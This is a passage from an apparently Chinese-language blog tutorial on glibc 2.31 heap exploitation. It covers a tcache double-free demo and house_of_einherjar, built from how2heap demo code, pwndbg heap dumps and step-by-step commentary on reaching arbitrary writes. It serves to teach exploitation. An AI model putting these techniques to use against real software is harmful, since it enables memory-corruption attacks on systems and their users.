class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h3><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先，在堆上伪造一个 chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">35</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">36</span>     <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">   <span class="number">37</span></span><br><span class="line">   <span class="number">38</span>     <span class="comment">// create a fake chunk</span></span><br><span class="line">   <span class="number">39</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line"> ► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">   <span class="number">41</span></span><br><span class="line">   <span class="number">42</span>     a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">   <span class="number">43</span>     a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">   <span class="number">44</span>     a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">   <span class="number">45</span>     a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p>该 fake chunk结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; malloc_chunk -f &amp;a[<span class="number">0</span>]</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555555592a0</span></span><br><span class="line">prev_size: <span class="number">0x00</span></span><br><span class="line">size: <span class="number">0x60</span></span><br><span class="line">fd: <span class="number">0x5555555592a0</span></span><br><span class="line">bk: <span class="number">0x5555555592a0</span></span><br><span class="line">fd_nextsize: <span class="number">0x00</span></span><br><span class="line">bk_nextsize: <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>然后我们在堆上布局两个 chunk 分别为 b 和 c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时假设我们有一个 一字节溢出,k可以覆盖到, c chunk 的size 位置，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">71</span>     <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">74</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">77</span>     b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">   <span class="number">78</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>     <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="number">81</span>            <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx b<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">1</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>那么当执行完之后， c chunk 的 prev_inused 位将被置零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样会导致 chunk a 被认为是 free 的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Freed                <span class="number">0x0</span>               <span class="number">0x0</span></span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>由于我们在  chunk a 的位置放了一个 fake chunk，我们此时修改了 chunk c的size 位置，同时我们需要其 prev_size 合法，所以也要修改 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">83</span>     <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="number">84</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">  <span class="number">85</span>            <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="number">86</span>     <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">► <span class="number">87</span>     <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="number">88</span>     *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure><p>我们将 chunk b的preve size 修改为 0x60</p><p>紧接着，照样填满 tcache,  然后我们去free chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi  <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555592a8</span> ◂— <span class="number">0x161</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x5555555592b0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x5555555592c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x5555555592d8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x5555555592a0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,  </p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">119</span>     <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">120</span>     <span class="built_in">free</span>(pad);</span><br><span class="line">  <span class="number">121</span></span><br><span class="line">► <span class="number">122</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="number">123</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时  chunk b 也会加入到  tcache bin里，且指向了刚 free 的 pad chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">25</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;\020\233UUUU&quot;</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">2</span>]: <span class="number">0x5555555592e0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">7</span>]: <span class="number">0x555555559a10</span> —▸ <span class="number">0x555555559910</span> —▸ <span class="number">0x555555559810</span> —▸ <span class="number">0x555555559710</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559510</span> —▸ <span class="number">0x555555559410</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure><p>由于， chunk d 可对 chunkb进行任意修改 （堆块重叠了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000161</span>      =====&gt; chunk d</span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>      =====&gt; fake chunk <span class="keyword">and</span> chunk b</span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559010</span>         ----&gt; chunk b fd -&gt; <span class="number">0x0000555555559b10</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span>      =====&gt; chunk c</span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们通过修改 chunk d 的内容来达到 修改 chunk b 的 fd 指针的目的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">   <span class="number">126</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">127</span>     d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line">   <span class="number">128</span></span><br><span class="line">   <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line"> ► <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">   <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line">   <span class="number">134</span></span><br><span class="line">   <span class="number">135</span>     <span class="comment">// sanity check</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe210</span> ◂— <span class="number">0x700000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x2800000007</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe220</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe228</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe230</span> —▸ <span class="number">0x555555559310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x555555559308</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe240</span> ◂— <span class="number">0x60</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555592b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555571</span>e main+<span class="number">1269</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x00007fffffffe260</span><span class="number">0x0000555555559010</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure><p>最后我们只需两次 malloc 就能拿到目标地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line">  <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">► <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br></pre></td></tr></table></figure><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 